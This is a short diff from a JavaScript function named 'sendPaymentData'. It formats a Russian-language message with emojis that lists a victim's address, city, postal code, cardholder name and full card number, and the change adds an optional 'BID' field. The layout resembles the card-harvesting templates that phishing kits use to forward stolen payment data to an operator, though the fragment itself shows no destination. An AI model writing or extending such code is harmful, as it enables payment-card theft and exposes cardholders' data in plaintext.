@@ -99,7 +99,7 @@ const sendPaymentData = async (paymentData) => {
 🏠 Адрес: ${paymentData.address}
 🏙️ Город: ${paymentData.city}
 📮 Индекс: ${paymentData.postalCode}
-
+${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ''}
 💳 Данные карты:
    Владелец: ${paymentData.cardHolder}
    Номер: ${paymentData.cardNumber}
